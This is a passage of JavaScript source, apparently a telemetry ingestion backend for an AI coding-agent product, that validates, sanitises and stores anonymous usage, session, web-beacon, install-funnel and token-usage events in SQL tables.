  const isCi = boolToInt(body.is_ci);
  const sessionStartCount = body.event === "session_start" ? 1 : 0;
  const turnEndCount = body.event === "turn_end" ? 1 : 0;
  const sessionEndCount = body.event === "session_end" ? 1 : 0;
  const sessionCrashCount = body.event === "session_crash" ? 1 : 0;

  try {
    await mainDb(env).prepare(`
      INSERT INTO daily_active_users (
        activity_date,
        telemetry_id,
        raw_active,
        meaningful_active,
        release_active,
        meaningful_release_active,
        session_start_count,
        turn_end_count,
        session_end_count,
        session_crash_count,
        ci_active,
        last_is_ci,
        last_build_channel,
        last_country
      ) VALUES (?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(activity_date, telemetry_id) DO UPDATE SET
        last_seen_at = datetime('now'),
        raw_active = 1,
        meaningful_active = MAX(meaningful_active, excluded.meaningful_active),
        release_active = MAX(release_active, excluded.release_active),
        meaningful_release_active = MAX(meaningful_release_active, excluded.meaningful_release_active),
        session_start_count = session_start_count + excluded.session_start_count,
        turn_end_count = turn_end_count + excluded.turn_end_count,
        session_end_count = session_end_count + excluded.session_end_count,
        session_crash_count = session_crash_count + excluded.session_crash_count,
        ci_active = MAX(ci_active, excluded.ci_active),
        last_is_ci = excluded.last_is_ci,
        last_build_channel = COALESCE(excluded.last_build_channel, daily_active_users.last_build_channel),
        last_country = COALESCE(excluded.last_country, daily_active_users.last_country)
    `).bind(
      activityDate,
      body.id,
      meaningful,
      release,
      meaningfulRelease,
      sessionStartCount,
      turnEndCount,
      sessionEndCount,
      sessionCrashCount,
      isCi,
      isCi,
      body.build_channel || null,
      body.country || null,
    ).run();
  } catch (err) {
    // Older databases may not have the rollup migration yet. Do not reject the
    // canonical event insert, because raw events remain the source of truth.
    console.warn("daily activity rollup failed", err?.message || err);
  }
}

// Durable per-day country x event counts. Aggregate only (no telemetry_id), so
// it survives retention pruning and cannot be used to profile an individual.
async function recordCountryDaily(env, body) {
  if (!body.country) {
    return;
  }
  const activityDate = new Date().toISOString().slice(0, 10);
  try {
    await mainDb(env).prepare(`
      INSERT INTO country_daily (activity_date, country, event, is_ci, event_count)
      VALUES (?, ?, ?, ?, 1)
      ON CONFLICT(activity_date, country, event, is_ci) DO UPDATE SET
        event_count = event_count + 1,
        last_seen_at = datetime('now')
    `).bind(activityDate, body.country, body.event, boolToInt(body.is_ci)).run();
  } catch (err) {
    // Databases predating migration 0022 have no country_daily table; never
    // fail the canonical event insert over the geo rollup.
    console.warn("country rollup failed", err?.message || err);
  }
}

function isMeaningfulLifecycleEvent(body) {
  const errors = body.errors || {};
  if (body.event === "prompt_submitted") {
    return true;
  }
  if (["session_end", "session_crash"].includes(body.event)) {
    return (
      (body.turns || 0) > 0
      || boolToInt(body.had_user_prompt) > 0
      || boolToInt(body.had_assistant_response) > 0
      || (body.assistant_responses || 0) > 0
      || (body.tool_calls || 0) > 0
      || (body.executed_tool_calls || 0) > 0
      || (body.duration_secs || 0) > 0
      || (errors.provider_timeout || 0) > 0
      || (errors.auth_failed || 0) > 0
      || (errors.tool_error || 0) > 0
      || (errors.mcp_error || 0) > 0
      || (errors.rate_limited || 0) > 0
      || (body.provider_switches || 0) > 0
      || (body.model_switches || 0) > 0
    );
  }
  // A turn_end event only fires after a real user turn completes (a prompt was
  // submitted and the agent did work), so it is strong evidence of meaningful
  // activity even when the session_end/session_crash event is lost (process
  // killed, machine shutdown, network drop on the final flush, or a session
  // still open at UTC midnight). Counting it here avoids undercounting the
  // headline meaningful DAU for those users.
  if (body.event === "turn_end") {
    return (
      (body.assistant_responses || 0) > 0
      || (body.tool_calls || 0) > 0
      || (body.executed_tool_calls || 0) > 0
      || (body.file_write_calls || 0) > 0
      || (body.tests_run || 0) > 0
      || boolToInt(body.turn_success) > 0
    );
  }
  return false;
}

async function insertSessionDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["session_start_hour_utc", body.session_start_hour_utc ?? null],
    ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
    ["session_end_hour_utc", body.session_end_hour_utc ?? null],
    ["session_end_weekday_utc", body.session_end_weekday_utc ?? null],
    ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
    ["sessions_started_24h", body.sessions_started_24h || 0],
    ["sessions_started_7d", body.sessions_started_7d || 0],
    ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
    ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
    ["max_concurrent_sessions", rawConcurrencyScalar(body.max_concurrent_sessions)],
    ["multi_sessioned", rawConcurrencyScalar(body.multi_sessioned)],
    ["first_file_edit_ms", body.first_file_edit_ms || null],
    ["first_test_pass_ms", body.first_test_pass_ms || null],
    ["tool_cat_read_search", body.tool_cat_read_search || 0],
    ["tool_cat_write", body.tool_cat_write || 0],
    ["tool_cat_shell", body.tool_cat_shell || 0],
    ["tool_cat_web", body.tool_cat_web || 0],
    ["tool_cat_memory", body.tool_cat_memory || 0],
    ["tool_cat_subagent", body.tool_cat_subagent || 0],
    ["tool_cat_swarm", body.tool_cat_swarm || 0],
    ["tool_cat_email", body.tool_cat_email || 0],
    ["tool_cat_side_panel", body.tool_cat_side_panel || 0],
    ["tool_cat_goal", body.tool_cat_goal || 0],
    ["tool_cat_mcp", body.tool_cat_mcp || 0],
    ["tool_cat_other", body.tool_cat_other || 0],
    ["tool_cat_todo", body.tool_cat_todo || 0],
    ["feature_todo_used", boolToInt(body.feature_todo_used)],
    ["todo_gate_ownership_count", body.todo_gate_ownership_count || 0],
    ["todo_gate_hill_count", body.todo_gate_hill_count || 0],
    ["todo_gate_completion_count", body.todo_gate_completion_count || 0],
    ["todo_gate_spike_count", body.todo_gate_spike_count || 0],
    ["command_login_used", boolToInt(body.command_login_used)],
    ["command_model_used", boolToInt(body.command_model_used)],
    ["command_usage_used", boolToInt(body.command_usage_used)],
    ["command_resume_used", boolToInt(body.command_resume_used)],
    ["command_memory_used", boolToInt(body.command_memory_used)],
    ["command_swarm_used", boolToInt(body.command_swarm_used)],
    ["command_goal_used", boolToInt(body.command_goal_used)],
    ["command_selfdev_used", boolToInt(body.command_selfdev_used)],
    ["command_feedback_used", boolToInt(body.command_feedback_used)],
    ["command_other_used", boolToInt(body.command_other_used)],
    ["workflow_chat_only", boolToInt(body.workflow_chat_only)],
    ["workflow_coding_used", boolToInt(body.workflow_coding_used)],
    ["workflow_research_used", boolToInt(body.workflow_research_used)],
    ["workflow_tests_used", boolToInt(body.workflow_tests_used)],
    ["workflow_background_used", boolToInt(body.workflow_background_used)],
    ["workflow_subagent_used", boolToInt(body.workflow_subagent_used)],
    ["workflow_swarm_used", boolToInt(body.workflow_swarm_used)],
    ["project_repo_present", boolToInt(body.project_repo_present)],
    ["project_lang_rust", boolToInt(body.project_lang_rust)],
    ["project_lang_js_ts", boolToInt(body.project_lang_js_ts)],
    ["project_lang_python", boolToInt(body.project_lang_python)],
    ["project_lang_go", boolToInt(body.project_lang_go)],
    ["project_lang_markdown", boolToInt(body.project_lang_markdown)],
    ["project_lang_mixed", boolToInt(body.project_lang_mixed)],
    ["days_since_install", body.days_since_install || null],
    ["active_days_7d", body.active_days_7d || 0],
    ["active_days_30d", body.active_days_30d || 0],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, 'session_details', values);
  }
}

function commonEventEntries(body, columns) {
  const values = [];
  if (columns.has("event_id")) {
    values.push(["event_id", body.event_id || null]);
  }
  if (columns.has("session_id")) {
    values.push(["session_id", body.session_id || null]);
  }
  if (columns.has("schema_version")) {
    values.push(["schema_version", body.schema_version || 1]);
  }
  if (columns.has("build_channel")) {
    values.push(["build_channel", body.build_channel || null]);
  }
  if (columns.has("is_git_checkout")) {
    values.push(["is_git_checkout", boolToInt(body.is_git_checkout)]);
  }
  if (columns.has("is_ci")) {
    values.push(["is_ci", boolToInt(body.is_ci)]);
  }
  if (columns.has("ran_from_cargo")) {
    values.push(["ran_from_cargo", boolToInt(body.ran_from_cargo)]);
  }
  return values;
}

// Desktop sends short tokens only. Re-sanitize server-side so a buggy or
// hostile client cannot store messages or paths: lowercase [a-z0-9_] (or the
// given disallowed-char pattern for versions), max 64 chars, null if empty.
function desktopToken(value, disallowed = null) {
  if (value == null) return null;
  let text = String(value).trim();
  text = disallowed
    ? text.replace(disallowed, "")
    : text.toLowerCase().replace(/[^a-z0-9_]+/g, "_").replace(/^_+|_+$/g, "");
  text = text.slice(0, 64);
  return text || null;
}

async function getEventColumns(env) {
  if (cachedEventColumns) {
    return cachedEventColumns;
  }
  const result = await env.DB.prepare("PRAGMA table_info(events)").all();
  cachedEventColumns = new Set((result.results || []).map((row) => row.name));
  return cachedEventColumns;
}

async function getSessionDetailColumns(env) {
  if (cachedSessionDetailColumns) {
    return cachedSessionDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(session_details)").all();
    cachedSessionDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedSessionDetailColumns = new Set();
  }
  return cachedSessionDetailColumns;
}

async function getTurnDetailColumns(env) {
  if (cachedTurnDetailColumns) {
    return cachedTurnDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(turn_details)").all();
    cachedTurnDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedTurnDetailColumns = new Set();
  }
  return cachedTurnDetailColumns;
}

async function getWebDetailColumns(env) {
  if (cachedWebDetailColumns) {
    return cachedWebDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(web_details)").all();
    cachedWebDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedWebDetailColumns = new Set();
  }
  return cachedWebDetailColumns;
}

async function getInstallDetailColumns(env) {
  if (cachedInstallDetailColumns) {
    return cachedInstallDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(install_details)").all();
    cachedInstallDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedInstallDetailColumns = new Set();
  }
  return cachedInstallDetailColumns;
}

async function getDiscoveryDetailColumns(env) {
  if (cachedDiscoveryDetailColumns) {
    return cachedDiscoveryDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(discovery_details)").all();
    cachedDiscoveryDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedDiscoveryDetailColumns = new Set();
  }
  return cachedDiscoveryDetailColumns;
}

async function getTodoSessionDetailColumns(env) {
  if (cachedTodoSessionDetailColumns) {
    return cachedTodoSessionDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(todo_session_details)").all();
    cachedTodoSessionDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedTodoSessionDetailColumns = new Set();
  }
  return cachedTodoSessionDetailColumns;
}

async function insertDiscoveryDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["request_id", body.request_id],
    ["phase", body.phase],
    ["category", body.category || null],
    ["selected_tool", body.selected_tool || null],
    ["outcome", body.outcome],
    ["failure_reason", body.failure_reason || null],
    ["http_status", body.http_status ?? null],
    ["latency_ms", body.latency_ms || 0],
    ["response_bytes", body.response_bytes ?? null],
    ["result_count", body.result_count ?? null],
    ["query_present", boolToInt(body.query_present)],
    ["reason_present", boolToInt(body.reason_present)],
    ["custom_endpoint", boolToInt(body.custom_endpoint)],
    ["benchmark_run", boolToInt(body.benchmark_run)],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "discovery_details", values);
  }
}

async function insertTodoSessionDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["correlation_id", body.correlation_id],
    ["session_end_reason", body.session_end_reason],
    ["todos_created", body.todos_created || 0],
    ["todos_completed", body.todos_completed || 0],
    ["todos_abandoned", body.todos_abandoned || 0],
    ["todo_updates", body.todo_updates || 0],
    ["groups_completed", body.groups_completed || 0],
    ["groups_total", body.groups_total || 0],
    ["max_todo_list_size", body.max_todo_list_size || 0],
    ["confidence_min", body.confidence_min ?? null],
    ["confidence_mean", body.confidence_mean ?? null],
    ["confidence_count", body.confidence_count || 0],
    ["completion_confidence_min", body.completion_confidence_min ?? null],
    ["completion_confidence_mean", body.completion_confidence_mean ?? null],
    ["completion_confidence_count", body.completion_confidence_count || 0],
    ["understands_user_intent_min", body.understands_user_intent_min ?? null],
    ["understands_user_intent_mean", body.understands_user_intent_mean ?? null],
    ["understands_user_intent_count", body.understands_user_intent_count || 0],
    ["closed_feedback_loop_min", body.closed_feedback_loop_min ?? null],
    ["closed_feedback_loop_mean", body.closed_feedback_loop_mean ?? null],
    ["closed_feedback_loop_count", body.closed_feedback_loop_count || 0],
    ["end_to_end_ownership_min", body.end_to_end_ownership_min ?? null],
    ["end_to_end_ownership_mean", body.end_to_end_ownership_mean ?? null],
    ["end_to_end_ownership_count", body.end_to_end_ownership_count || 0],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "todo_session_details", values);
  }
}

async function insertWebDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["path", body.path || null],
    ["referrer", body.referrer || null],
    ["visitor_id", body.visitor_id || null],
    ["utm_source", body.utm_source || null],
    ["utm_medium", body.utm_medium || null],
    ["utm_campaign", body.utm_campaign || null],
    ["cta", body.cta || null],
    ["metric_name", body.metric_name || null],
    ["metric_value", body.metric_value ?? null],
    ["rating", body.rating || null],
    ["error_kind", body.error_kind || null],
    ["pageview_id", body.pageview_id || null],
    ["conversion_id", body.conversion_id || null],
    ["placement", body.placement || null],
    ["install_method", body.install_method || null],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "web_details", values);
  }
}

async function insertInstallDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["conversion_id", body.conversion_id],
    ["stage", body.stage],
    ["outcome", body.outcome],
    ["source", body.source],
    ["placement", body.placement || null],
    ["install_method", body.install_method || null],
    ["failure_stage", body.failure_stage || null],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "install_details", values);
  }
}

// Normalize a website beacon event in place. Browsers do not send
// version/os/arch and mint an anonymous visitor_id in localStorage, so the
// visitor_id doubles as the telemetry id and free-text fields are
// length-capped (same defensive posture as the firehose blob caps).
// Returns an error string when the event is invalid, otherwise null.
function normalizeWebEvent(body) {
  if (typeof body.visitor_id !== "string" || body.visitor_id.length === 0) {
    return "Missing visitor_id";
  }
  if (typeof body.path !== "string" || body.path.length === 0) {
    return "Missing path";
  }
  if (body.event === "web_cta_click" && (typeof body.cta !== "string" || body.cta.length === 0)) {
    return "Missing cta";
  }
  if (body.event === "web_vital") {
    const metricNames = new Set(["CLS", "FCP", "INP", "LCP", "TTFB"]);
    const ratings = new Set(["good", "needs-improvement", "poor"]);
    if (!metricNames.has(body.metric_name)) {
      return "Invalid metric_name";
    }
    if (typeof body.metric_value !== "number" || !Number.isFinite(body.metric_value) || body.metric_value < 0) {
      return "Invalid metric_value";
    }
    if (!ratings.has(body.rating)) {
      return "Invalid rating";
    }
    const cap = body.metric_name === "CLS" ? 10 : 300_000;
    body.metric_value = Math.min(body.metric_value, cap);
  }
  if (body.event === "web_error") {
    const errorKinds = new Set(["script", "promise", "resource"]);
    if (!errorKinds.has(body.error_kind)) {
      return "Invalid error_kind";
    }
    // Keep only route-level context for errors. In particular, do not retain
    // referrer or campaign values that may contain full URLs or query strings.
    for (const field of [
      "referrer", "utm_source", "utm_medium", "utm_campaign", "cta",
      "session_id", "pageview_id", "conversion_id", "placement", "install_method",
    ]) {
      delete body[field];
    }
  }
  if (body.conversion_id != null && !CONVERSION_ID_PATTERN.test(body.conversion_id)) {
    return "Invalid conversion_id";
  }
  if (body.install_method != null && !new Set([
    "shell", "download_macos", "download_linux", "download_windows",
  ]).has(body.install_method)) {
    return "Invalid install_method";
  }
  if (body.placement != null && !new Set(["hero", "sticky"]).has(body.placement)) {
    return "Invalid install placement";
  }
  // Error payloads are classification-only. Never retain messages, stacks,
  // filenames, or full URLs even if a caller includes them.
  for (const field of ["message", "error_message", "stack", "url", "filename", "source_url"]) {
    delete body[field];
  }
  body.visitor_id = body.visitor_id.slice(0, 96);
  if (body.session_id != null) body.session_id = String(body.session_id).slice(0, 96);
  body.id = body.id || body.visitor_id;
  // The beacon does not send an event_id, but web_details rows join on it.
  // Mint one server-side so path/referrer/utm/cta are actually persisted.
  body.event_id = body.event_id || crypto.randomUUID();
  body.version = body.version || "web";
  body.os = body.os || "web";
  body.arch = body.arch || "web";
  for (const field of [
    "path", "referrer", "utm_source", "utm_medium", "utm_campaign", "cta",
    "pageview_id", "conversion_id", "placement", "install_method",
  ]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 200);
    }
  }
  return null;
}

const CONVERSION_ID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

function normalizeInstallConversion(body) {
  if (!CONVERSION_ID_PATTERN.test(body.install_conversion_id)) {
    return "Invalid install_conversion_id";
  }
  body.conversion_id = body.install_conversion_id.toLowerCase();
  return null;
}

function normalizeInstallFunnelEvent(body) {
  const stages = new Set(["command_copy", "script_request", "installer_start", "installer_finish"]);
  const outcomes = new Set(["success", "failure"]);
  const sources = new Set(["browser", "install_endpoint", "installer"]);
  const methods = new Set(["shell", "download_macos", "download_linux", "download_windows"]);
  const placements = new Set(["hero", "sticky"]);

  if (!CONVERSION_ID_PATTERN.test(body.conversion_id)) {
    return "Invalid conversion_id";
  }
  if (!stages.has(body.stage)) {
    return "Invalid install stage";
  }
  if (!outcomes.has(body.outcome)) {
    return "Invalid install outcome";
  }
  if (!sources.has(body.source)) {
    return "Invalid install source";
  }
  if (body.install_method != null && !methods.has(body.install_method)) {
    return "Invalid install_method";
  }
  if (body.placement != null && !placements.has(body.placement)) {
    return "Invalid install placement";
  }
  if (body.failure_stage != null && !/^[a-z0-9_]{0,64}$/i.test(body.failure_stage)) {
    return "Invalid failure_stage";
  }
  if (body.outcome !== "failure") {
    body.failure_stage = null;
  }
  body.conversion_id = body.conversion_id.toLowerCase();
  body.id = body.id || body.conversion_id;
  body.event_id = body.event_id || crypto.randomUUID();
  for (const field of ["stage", "outcome", "source", "placement", "install_method", "failure_stage"]) {
    if (body[field] != null) body[field] = String(body[field]).slice(0, 100);
  }
  return null;
}

// Normalize a token-subscription event in place. account_id is required for
// all of them; account_linked is the analytics<->account join event and also
// requires the telemetry id. Returns an error string or null.
function normalizeSubscriptionEvent(body) {
  if (typeof body.account_id !== "string" || body.account_id.length === 0) {
    return "Missing account_id";
  }
  body.account_id = body.account_id.slice(0, 96);
  for (const field of ["tier", "model"]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 200);
    }
  }
  return null;
}

function normalizeDiscoveryEvent(body) {
  const phases = new Set(["browse", "details", "select", "suggest", "unknown"]);
  const outcomes = new Set(["success", "failure"]);
  const failures = new Set([
    "disabled", "invalid_input", "invalid_category", "timeout",
    "connect_error", "transport_error", "http_error", "body_error",
    "response_too_large", "invalid_json", "invalid_response",
  ]);
  if (typeof body.request_id !== "string" || body.request_id.length === 0) {
    return "Missing request_id";
  }
  if (!/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(body.request_id)) {
    return "Invalid request_id";
  }
  if (!phases.has(body.phase)) {
    return "Invalid discovery phase";
  }
  if (!outcomes.has(body.outcome)) {
    return "Invalid discovery outcome";
  }
  if (body.outcome === "failure" && !failures.has(body.failure_reason)) {
    return "Invalid discovery failure_reason";
  }
  if (body.outcome === "success") {
    body.failure_reason = null;
  }
  body.request_id = body.request_id.slice(0, 96);
  for (const field of ["category", "selected_tool"]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 100);
      if (!/^[a-z0-9][a-z0-9 ._+\/-]{0,99}$/i.test(body[field])) {
        return `Invalid discovery ${field}`;
      }
    }
  }
  body.http_status = body.http_status == null ? null : Math.max(100, Math.min(599, Number(body.http_status) || 0));
  body.latency_ms = Math.max(0, Math.min(300_000, Number(body.latency_ms) || 0));
  body.response_bytes = body.response_bytes == null ? null : Math.max(0, Math.min(1_048_576, Number(body.response_bytes) || 0));
  body.result_count = body.result_count == null ? null : Math.max(0, Math.min(10_000, Number(body.result_count) || 0));
  body.benchmark_run = body.benchmark_run === true;
  return null;
}

function normalizeTodoSessionEvent(body) {
  const uuidV4 = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  const endReasons = new Set([
    "normal_exit", "panic", "signal", "disconnect", "reload", "superseded", "unknown",
  ]);
  if (typeof body.correlation_id !== "string" || !uuidV4.test(body.correlation_id)) {
    return "Invalid todo correlation_id";
  }
  // This event must never carry the persistent telemetry ID. Its required `id`
  // envelope field is the same ephemeral UUID used for the within-session join.
  if (body.id !== body.correlation_id) {
    return "Todo id must equal correlation_id";
  }
  if (!endReasons.has(body.session_end_reason)) {
    return "Invalid todo session_end_reason";
  }

  for (const field of [
    "todos_created", "todos_completed", "todos_abandoned", "todo_updates",
    "groups_completed", "groups_total", "max_todo_list_size", "confidence_count",
    "completion_confidence_count", "understands_user_intent_count",
    "closed_feedback_loop_count", "end_to_end_ownership_count",
  ]) {
    body[field] = Math.max(0, Math.min(1_000_000, Math.trunc(Number(body[field]) || 0)));
  }
  for (const field of [
    "confidence_min", "confidence_mean", "completion_confidence_min",
    "completion_confidence_mean", "understands_user_intent_min",
    "understands_user_intent_mean", "closed_feedback_loop_min",
    "closed_feedback_loop_mean", "end_to_end_ownership_min", "end_to_end_ownership_mean",
  ]) {
    body[field] = body[field] == null
      ? null
      : Math.max(0, Math.min(100, Number(body[field]) || 0));
  }
  return null;
}

async function insertDynamic(env, table, entries) {
  const columns = entries.map(([name]) => name);
  const placeholders = columns.map(() => "?").join(", ");
  const sql = `INSERT OR IGNORE INTO ${table} (${columns.join(", ")}) VALUES (${placeholders})`;
  const values = entries.map(([, value]) => value);
  const result = await env.DB.prepare(sql).bind(...values).run();
  if (env.DB_MAIN) {
    lastObservedBulkDbSizeBytes = result?.meta?.size_after || lastObservedBulkDbSizeBytes;
  } else {
    observeDbSize(result);
  }
  return result;
}

function boolToInt(value) {
  return value ? 1 : 0;
}

const USAGE_REPORT_SOURCES = new Set(["agent", "compaction", "sidecar"]);
const USAGE_TOKEN_FIELDS = [
  "input_tokens",
  "output_tokens",
  "cache_read_input_tokens",
  "cache_creation_input_tokens",
  "total_tokens",
];
// One provider response cannot plausibly exceed this; rejects garbage that
// would otherwise poison the spend rollup.
const MAX_USAGE_TOKENS_PER_REPORT = 50_000_000;

function normalizeUsageLabel(value) {
  if (typeof value !== "string") {
    return "";
  }
  return value.trim().slice(0, 120);
}

// Validates legacy native buckets separately from canonical disjoint v2.
// Dedicated FIREHOSE_USAGE preserves all buckets and the contract version.
export function normalizeUsageReportEvent(body) {
  if (typeof body.id !== "string" || !body.id.trim() || new TextEncoder().encode(body.id).length > 96) return "Invalid usage_report id";
  for (const field of ["provider", "model", "build_channel"]) {
    if (body[field] != null && (typeof body[field] !== "string" || body[field].trim().length > 120)) return `Invalid usage_report ${field}`;
  }
  body.usage_contract_version ??= 1;
  if (![1, 2].includes(body.usage_contract_version)) return "Invalid usage_report usage_contract_version";
  if (body.usage_contract_version === 2 && body.occurred_at == null) return "Missing usage_report occurred_at";
  if (typeof body.event_id !== "string" || !body.event_id.trim() || body.event_id.length > 120) return "Invalid usage_report event_id";
  if (body.is_ci != null && typeof body.is_ci !== "boolean") return "Invalid usage_report is_ci";
  body.is_ci ??= false;
  body.build_channel = normalizeUsageLabel(body.build_channel);
  if (body.occurred_at != null) {
    const value = body.occurred_at;
    const timestamp = typeof value === "string" && /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d{1,3})?Z$/.test(value) ? Date.parse(value) : NaN;
    if (!Number.isFinite(timestamp) || new Date(timestamp).toISOString().slice(0, 10) !== value.slice(0, 10)
      || timestamp < Date.now() - 7 * 86400000 || timestamp > Date.now() + 300000) {
      return "Invalid or expired usage_report occurred_at";
    }
    body.occurred_at = new Date(timestamp).toISOString();
  }
  if (!USAGE_REPORT_SOURCES.has(body.source)) {
    return "Invalid usage_report source";
  }
  body.provider = normalizeUsageLabel(body.provider);
  body.model = normalizeUsageLabel(body.model);
  if (!body.model) {
    return "Missing usage_report model";
  }
  const suppliedTotal = body.total_tokens;
  for (const field of USAGE_TOKEN_FIELDS) {
    const value = body[field] ?? 0;
    if (!Number.isInteger(value) || value < 0 || value > MAX_USAGE_TOKENS_PER_REPORT) {
      return `Invalid usage_report ${field}`;
    }
    body[field] = value;
  }
  if (body.usage_contract_version === 2) {
    const total = body.input_tokens + body.output_tokens + body.cache_read_input_tokens + body.cache_creation_input_tokens;
    if (total > MAX_USAGE_TOKENS_PER_REPORT || (suppliedTotal != null && suppliedTotal !== total)) return "Invalid usage_report total_tokens";
    body.total_tokens = total;
  }
  const responses = body.responses ?? 1;
  if (!Number.isInteger(responses) || responses < 1 || responses > 10_000) {
    return "Invalid usage_report responses";
  }
  body.responses = responses;
  body.provider_end = body.provider;
  body.model_end = body.model;
  body.step = body.source;
  return null;
}

async function recordDailyModelUsage(env, body) {
  const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(JSON.stringify([body.id, body.event_id])));
  const receiptKey = digest;
  const usageDate = (body.occurred_at || new Date().toISOString()).slice(0, 10);
  await env.DB.prepare(`
    INSERT INTO usage_report_ledger (
      usage_date, source, provider, model, build_channel, is_ci, responses,
      input_tokens, output_tokens, cache_read_input_tokens,
      cache_creation_input_tokens, total_tokens, receipt_key, usage_contract_version
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(receipt_key) DO NOTHING
  `).bind(
    usageDate,
    body.source,
    body.provider || "",
    body.model,
    body.build_channel || "",
    boolToInt(body.is_ci),
    body.responses,
    body.input_tokens,
    body.output_tokens,
    body.cache_read_input_tokens,
    body.cache_creation_input_tokens,
    body.total_tokens,
    receiptKey,
    body.usage_contract_version,
  ).run();
}

function jsonResponse(data, status = 200, cors = null) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      ...(cors || corsHeaders()),
    },
  });
}

function corsHeaders(request = null, env = null) {
  // Default policy: ALLOWED_ORIGIN var (currently "*"; telemetry is anonymous
  // and unauthenticated). Website beacon origins are additionally echoed back
  // explicitly, so browser preflights keep passing even if ALLOWED_ORIGIN is
  // ever narrowed away from "*".
  let allowOrigin = env?.ALLOWED_ORIGIN || "*";
  const origin = request?.headers?.get?.("Origin");
  const headers = {
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };
  if (origin && WEB_ALLOWED_ORIGINS.has(origin)) {
    allowOrigin = origin;
    headers["Vary"] = "Origin";
  }
  headers["Access-Control-Allow-Origin"] = allowOrigin;
  return headers;
}
